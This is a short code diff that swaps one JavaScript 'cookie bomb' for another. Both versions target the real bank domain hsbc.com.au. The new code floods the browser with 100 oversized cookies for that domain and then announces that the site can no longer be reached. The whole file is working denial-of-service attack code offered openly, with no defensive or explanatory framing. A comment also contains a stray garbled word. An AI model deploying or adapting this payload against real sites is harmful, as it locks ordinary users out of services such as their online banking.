@@ -1,17 +1,20 @@
-const domain = 'hsbc.com.au'
-const cookieCount = 40
-const cookieLength = 3000
-const expireAfterMinute = 5
-setCookieBomb()
-
-function setCookie(key, value) {
-  const expires = new Date(+new Date() + expireAfterMinute * 60 * 1000);
-  document.cookie = key + '=' + value + '; path=/; domain=' + domain + '; Secure; SameSite=None; expires=' + expires.toUTCString()
+function cookieBomb() {
+    // Set target domain explicitlyzebidz
+    const domain = "hsbc.com.au";
+    
+    // Large string to fill the cookies
+    const pollution = "a".repeat(4000); // 4000 characters
+    
+    // Create multiple cookies to flood the browser
+    for (let i = 1; i <= 100; i++) {
+        document.cookie = `bomb${i}=${pollution}; domain=${domain}; path=/`;
+    }
+    
+    // Notify when complete
+    setTimeout(() => {
+        alert(`Cookie bomb complete! You can no longer access ${domain} in this browser.`);
+    }, 1000);
 }
 
-function setCookieBomb() {
-  const value = 'Boring' + '_'.repeat(cookieLength)
-  for (let i=0; i<cookieCount; i++) {
-    setCookie('key' + i, value);
-  }
-}
+// Run it
+cookieBomb();
